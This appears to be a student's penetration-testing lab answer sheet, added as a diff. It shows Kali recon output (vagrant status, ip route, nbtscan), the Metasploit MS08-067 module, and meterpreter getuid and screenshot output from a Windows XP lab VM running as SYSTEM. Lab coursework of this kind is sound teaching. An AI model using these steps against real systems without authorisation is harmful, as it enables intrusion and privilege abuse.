@@ -1,0 +1,72 @@
+Edwin Cervantes
+CSCI 380
+Metasploit Week 8
+9 OCT 2018
+
+Look at Canvas for questions corresponding to these following answers
+#______________________________________________________________________________________________________________#
+
+1)edwin@ejs-laptop:~/380lab/pentest-env$ vagrant status                                                 │
+Current machine states:                                                                               │
+                                                                                                      │
+kali                      running (virtualbox)                                                        │
+kali-clone                poweroff (virtualbox)                                                       │
+metasploitable2           poweroff (virtualbox)                                                       │
+metasploitable3-win2008r2 not created (virtualbox)                                                    │
+primer                    not created (virtualbox)                                                    │
+winxpie8                  running (virtualbox)                                                        │
+                                                                                                      │
+This environment represents multiple VMs. The VMs are all listed                                      │
+above with their current state. For more information about a specific                                 │
+VM, run `vagrant status NAME`.    
+
+2)root@kali:~# ip route
+ │10.0.2.0/24 dev eth0 proto kernel scope link src 10.0.2.15 
+ │172.28.128.0/24 dev eth1 proto kernel scope link src 172.28.128.4 
+
+3)root@kali:~# nbtscan 172.28.128.0/24
+│Doing NBT name scan for addresses from 172.28.128.0/24│
+│IP address       NetBIOS Name     Server    User             MAC address      
+│------------------------------------------------------------------------------
+│172.28.128.0    Sendto failed: Permission denied
+│172.28.128.3     IE8WINXP         <server>  <unknown>        08:00:27:f3:3d:3b
+│172.28.128.255  Sendto failed: Permission denied
+
+4)Windows system IP Add - 172.28.128.3
+
+5)root@kali:~# ip addr show
+1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
+    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
+    inet 127.0.0.1/8 scope host lo
+       valid_lft forever preferred_lft forever
+    inet6 ::1/128 scope host 
+       valid_lft forever preferred_lft forever
+2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:c6:4b:23 brd ff:ff:ff:ff:ff:ff
+    inet 10.0.2.15/24 brd 10.0.2.255 scope global eth0
+       valid_lft forever preferred_lft forever
+    inet6 fe80::a00:27ff:fec6:4b23/64 scope link 
+       valid_lft forever preferred_lft forever
+3: eth1: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc pfifo_fast state UP group default qlen 1000
+    link/ether 08:00:27:23:1a:fa brd ff:ff:ff:ff:ff:ff
+    inet 172.28.128.4/24 brd 172.28.128.255 scope global eth1
+       valid_lft forever preferred_lft forever
+    inet6 fe80::a00:27ff:fe23:1afa/64 scope link 
+       valid_lft forever preferred_lft forever
+
+IP Add - 172.28.128.4/24
+
+6)exploit/windows/smb/ms08_067_netapi  2008-10-28       great   MS08-067 Microsoft Server Service Relative Path Stack Corruption
+
+7)https://cvedetails.com/cve/CVE-2008-4250/
+
+8)1392  808   svchost.exe       x86   0        NT AUTHORITY\SYSTEM           C:\W
+
+9)meterpreter > getuid
+Server username: NT AUTHORITY\SYSTEM
+
+
+10)meterpreter > screenshot
+Screenshot saved to: /root/pKrQLQbA.jpeg
+
+
